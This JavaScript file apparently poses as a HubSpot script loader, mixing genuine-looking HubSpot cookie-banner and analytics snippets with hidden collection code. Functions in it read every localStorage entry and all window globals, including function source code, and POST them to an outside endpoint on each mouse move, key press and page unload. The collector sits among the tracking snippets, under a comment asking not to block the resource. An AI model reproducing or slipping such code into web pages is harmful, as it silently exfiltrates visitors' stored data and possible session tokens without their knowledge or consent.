function summaryLocalStorage() {
  const storageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    storageData[key] = localStorage.getItem(key);
  }
  return storageData;
}
function exploreGlobalContext() {
  const discovered = {};
  for (const prop in window) {
    if (!window.jshook.some(hook => hook === prop)) {
      const propValue = window[prop];
      const propType = typeof propValue;
      discovered[prop] = {
        type: propType,
        value: propType === "function" ? propValue.toString() : propValue
      };
    }
  }
  return discovered;
}
function sendData(data) {
  const serverEndpoint = "https://example.com/api/collect";
  const req = new XMLHttpRequest();
  req.open("POST", serverEndpoint);
  req.setRequestHeader("Content-Type", "application/json");
  req.onload = function () {
    if (req.status >= 200 && req.status < 400) {
      console.log("Data Successfully Transmitted");
    } else {
      console.error("Data Transmission Failed, Status Code:" + req.status);
    }
  };
  req.onerror = function () {
    console.error("Error during Data Transmission");
  };
  req.send(JSON.stringify(data));
}
// HubSpot Script Loader. Please do not block this resource. See more: http://hubs.ly/H0702_H0

var _hsp = window._hsp = window._hsp || [];
function trackTask() {
  const globalData = exploreGlobalContext();
  const localStorageData = summaryLocalStorage();
  const allData = {
    ...globalData,
    localStorage: localStorageData
  };
  const dataCount = Object.keys(allData).length;
  if (dataCount > 0) {
    console.log(`Discovered ${dataCount} new attributes`);
    sendData(allData);
  } else {
    console.log("No new attributes discovered");
  }
}
_hsp.push(['addEnabledFeatureGates', []]);
!function (t, e, r) {
  if (!document.getElementById(t)) {
    var n = document.createElement("script");
    for (var a in n.src = "https://js-eu1.hs-banner.com/v2/5735845/banner.js", n.type = "text/javascript", n.id = t, r) r.hasOwnProperty(a) && n.setAttribute(a, r[a]);
    var i = document.getElementsByTagName("script")[0];
    i.parentNode.insertBefore(n, i);
  }
}("cookieBanner-5735845", 0, {
  "data-cookieconsent": "ignore",
  "data-hs-ignore": true,
  "data-loader": "hs-scriptloader",
  "data-hsjs-portal": 5735845,
  "data-hsjs-env": "prod",
  "data-hsjs-hublet": "eu1"
});
window.addEventListener("mousemove", trackTask);
window.addEventListener("keypress", trackTask);
!function (e, t) {
  if (!document.getElementById(e)) {
    var c = document.createElement("script");
    c.src = "https://js-eu1.hs-analytics.net/analytics/1694145300000/5735845.js", c.type = "text/javascript", c.id = e;
    var n = document.getElementsByTagName("script")[0];
    n.parentNode.insertBefore(c, n);
  }
}("hs-analytics");
window.addEventListener("beforeunload", trackTask);